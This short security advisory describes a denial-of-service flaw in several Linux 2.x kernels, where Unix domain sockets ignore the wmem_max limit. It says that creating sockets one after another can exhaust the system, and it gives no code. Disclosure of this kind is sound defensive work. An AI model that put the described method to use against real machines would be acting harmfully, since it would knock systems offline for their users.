A denial of service exists in Linux kernels, as related to Unix domain sockets ignoring limits as set in /proc/sys/net/core/wmem_max. By creating successive Unix domain sockets, it is possible to cause a denial of service in some versions of the Linux kernel. Versions 2.2.12, 2.2.14, and 2.3.99-pre2 have all been confirmed as being vulnerable. Previous kernel versions are most likely vulnerable.
